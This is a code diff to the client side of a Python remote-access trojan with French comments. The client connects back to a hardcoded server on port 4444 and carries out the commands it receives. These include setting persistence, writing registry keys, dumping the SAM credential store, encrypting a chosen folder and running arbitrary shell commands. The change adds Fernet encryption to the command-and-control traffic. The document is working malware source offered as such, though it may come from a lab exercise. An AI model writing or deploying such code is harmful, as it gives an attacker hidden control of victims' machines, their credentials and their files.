@@ -10,9 +10,18 @@ import mss
 from cryptography.fernet import Fernet
 
 
-SERVER_IP = "192.168.83.133"
+SERVER_IP = "192.168.85.133"
 SERVER_PORT = 4444
 BUFFER = 4096
+
+# on charge la meme clef que le serveur
+try:
+    with open("secret.key", "rb") as key_file:
+        KEY = key_file.read()
+    cipher = Fernet(KEY)
+except FileNotFoundError:
+    print("[-] Fichier secret.key introuvable")
+    sys.exit(1)
 
 
 # recupere la vraie ip de la machine, pas 127.0.0.1
@@ -36,22 +45,29 @@ def main():
             sock.connect((SERVER_IP, SERVER_PORT))
             print(f"[+] Connecte a {SERVER_IP}:{SERVER_PORT}")
 
-            # on envoie le hostname et notre ip
+            # le handshake reste en clair pour que le serveur lise l'info
             sock.send(f"{socket.gethostname()} - {get_ip()}".encode())
 
             while True:
                 try:
-                    commande = sock.recv(BUFFER).decode("utf-8").strip()
-                    if not commande:
+                    data_recue = sock.recv(BUFFER)
+                    if not data_recue:
                         break
 
-                    if commande == "exit":
+                    # exit est envoye en clair par le serveur
+                    if data_recue == b"exit":
                         sock.close()
                         return
 
-                    elif commande == "persistance":
+                    # on dechiffre la commande recue
+                    try:
+                        commande = cipher.decrypt(data_recue).decode("utf-8").strip()
+                    except Exception:
+                        commande = data_recue.decode("utf-8").strip()
+
+                    if commande == "persistance":
                         resultat = setup_persistence()
-                        sock.send(resultat.encode())
+                        sock.send(cipher.encrypt(resultat.encode()))
 
                     elif commande.startswith("regedit "):
                         parts = commande.split(" ", 3)
@@ -59,7 +75,7 @@ def main():
                             resultat = add_registry_key(parts[1], parts[2], parts[3])
                         else:
                             resultat = "Usage: regedit CHEMIN NOM VALEUR"
-                        sock.send(resultat.encode())
+                        sock.send(cipher.encrypt(resultat.encode()))
 
                     elif commande == "sam":
                         resultat = dump_sam()
@@ -72,16 +88,16 @@ def main():
                     elif commande.startswith("encrypt "):
                         chemin = commande.split(" ", 1)[1]
                         resultat = encrypt_folder(chemin)
-                        sock.send(resultat.encode())
+                        sock.send(cipher.encrypt(resultat.encode()))
 
                     else:
                         resultat = execute_cmd(commande)
-                        sock.send(resultat.encode())
+                        sock.send(cipher.encrypt(resultat.encode()))
 
                 except Exception as e:
                     print(f"[!] Erreur: {e}")
                     try:
-                        sock.send(f"Erreur: {e}".encode())
+                        sock.send(cipher.encrypt(f"Erreur: {e}".encode()))
                     except:
                         break
 
